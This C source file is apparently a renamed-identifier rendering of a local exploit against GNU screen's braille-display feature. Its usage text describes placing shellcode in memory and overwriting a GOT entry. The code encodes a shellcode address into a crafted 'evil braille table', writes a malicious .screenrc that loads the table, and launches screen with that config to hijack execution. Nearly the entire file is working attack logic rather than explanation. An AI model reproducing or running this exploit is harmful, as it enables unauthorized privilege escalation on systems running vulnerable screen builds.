#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  buf ;
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 char EOF ; 
 int /*<<< orphan*/  FIND ; 
 int OFFSET ; 
 int /*<<< orphan*/  PUT ; 
 int /*<<< orphan*/  SCREEN ; 
 char* SCREENRC ; 
 char* TABLE ; 
 int FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (unsigned int,char*) ; 
 scalar_t__ FUNC2 (int /*<<< orphan*/ ,char*,char*,char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC5 (char*,char*) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ *,char*,...) ; 
 char FUNC7 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC8 (char*,char,int) ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (char*,int,char*,...) ; 
 int /*<<< orphan*/  FUNC11 (int /*<<< orphan*/ ,char*,char**) ; 
 int /*<<< orphan*/ * stderr ; 
 int /*<<< orphan*/  FUNC12 (int /*<<< orphan*/ ) ; 

int
FUNC13(int argc, char **argv)
{
	char *a, *tmp, buf[64], store[10], c;
	unsigned long address;
	unsigned int w[4];
	int i, b, start;	
	FILE *fd;

	if(argc == 1) {
		FUNC6(stderr, "\n%s [ -p ] [ -f ] [ -a <shellcode address> -o <offset to GOT address> ]\n\n", argv[0]);
		FUNC6(stderr, "-p switch places shellcode into memory\n");
		FUNC6(stderr, "-f switch finds shellcode address\n\n");
		FUNC6(stderr, "No switch runs exploit with options:\n");
		FUNC6(stderr, "\t-a <shellcode address>\n");
		FUNC6(stderr, "\t-o <offset to GOT address>\n\n");
		FUNC3(0);
	}
	
	start = OFFSET;
	
	while((c = FUNC7(argc, argv, "pfa:o:")) != EOF) {
		switch(c) {
			case 'p':
				FUNC12(PUT);
				FUNC3(0);
			case 'f':
				FUNC12(FIND);
				FUNC3(0);
			case 'a':
				FUNC11(optarg, "%p", &tmp);
				address = (long)tmp;
				break;
			case 'o':
				start = FUNC0(optarg);
				break;
			default:
				FUNC6(stderr, "hehehehe?\n");
				FUNC3(0);
		}
	}
				
			
	FUNC6(stderr, ". preparing evil braille table\n");

	if((fd = FUNC5(TABLE, "w")) == NULL) {
                FUNC9("fopen");
                FUNC3(1);
        }

	FUNC6(stderr, ". converting: 0x%lx into braille table strings\n", address); 
 
	w[0] = (address & 0x000000ff);
        w[1] = (address & 0x0000ff00) >> 8;
        w[2] = (address & 0x00ff0000) >> 16;
        w[3] = (address & 0xff000000) >> 24;
	
	for(i = 0; i < 4; i++) { 
		FUNC8(store, 'o', 9);
		FUNC1(w[i], store);
		FUNC8(buf, '\0', sizeof(buf));
		FUNC10(buf, sizeof(buf), "%d ff %s\n", start+i, store);
		FUNC6(stderr, ". writing to braille table: %s", buf);
		FUNC6(fd, "%s", buf);
	}
	
	FUNC4(fd);
	
	FUNC6(stderr, ". preparing evil .screenrc\n");
		
	if((fd = FUNC5(SCREENRC, "w")) == NULL) {
                FUNC9("fopen");
                FUNC3(1);
        }
	
	FUNC6(fd, "bd_start_braille on\n");
	FUNC8(buf, '\0', sizeof(buf));
	FUNC10(buf, sizeof(buf), "bd_braille_table %s\n", TABLE);
	FUNC6(fd, "%s", buf);
	FUNC6(fd, "bd_type powerbraille_40\n");
	FUNC6(fd, "bd_port /dev/ttyS0\n");
	FUNC4(fd);
	
	FUNC6(stderr, ". now exploiting blind, hehehe\n");
	
	if(FUNC2(SCREEN, "screen", "-c", SCREENRC, NULL)) {
		FUNC6(stderr, ". error executing\n");
		FUNC3(1);
	} 
}